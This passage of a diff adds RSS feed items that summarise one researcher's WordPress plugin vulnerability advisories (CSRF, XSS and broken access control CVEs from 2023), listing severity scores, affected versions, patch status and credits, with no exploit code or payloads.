+      <guid>http://localhost:1313/docs/07_research/12-cve-2023-26516/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Request Forgery (CSRF)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-request-forgery-csrf&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-request-forgery-csrf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Debug Assistant Plugin &amp;lt;= 1.4 is vulnerable to Cross Site Request Forgery (CSRF)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 8.8&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Request Forgery:&lt;/strong&gt; Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Debug Assistant&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;1.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A5: Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Request Forgery (CSRF)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-26516&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-26516&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;8.8&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;29fe448c29d4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;28 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;3 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-26522</title>
+      <link>http://localhost:1313/docs/07_research/15-cve-2023-26522/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/15-cve-2023-26522/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Broken Access Control&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--broken-access-control&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--broken-access-control&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Users can access pages or perform actions they shouldn&amp;rsquo;t be allowed to, like viewing other people&amp;rsquo;s data.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress WP Repost Plugin &amp;lt;= 0.1 is vulnerable to a high priority Broken Access Control&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 0.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 6.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Broken Access Control:&lt;/strong&gt; Users can access pages or perform actions they shouldn&amp;rsquo;t be allowed to, like viewing other people&amp;rsquo;s data.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;WP Repost&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 0.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available (Patchstack mitigation rule issued)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A5: Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-26522&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-26522&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🔴High&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;6.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;c4bf9e1aa104&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;28 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;8 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-26527</title>
+      <link>http://localhost:1313/docs/07_research/17-cve-2023-26527/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/17-cve-2023-26527/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Debug Assistant Plugin &amp;lt;= 1.4 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Debug Assistant&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;1.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-26527&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-26527&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;a881348f2d40&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;28 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;3 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-26541</title>
+      <link>http://localhost:1313/docs/07_research/18-cve-2023-26541/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/18-cve-2023-26541/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress asMember Plugin &amp;lt;= 1.5.4 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;asMember&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-26541&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-26541&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;a9b06cd315cd&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;24 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;18 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-28168</title>
+      <link>http://localhost:1313/docs/07_research/13-cve-2023-28168/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/13-cve-2023-28168/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
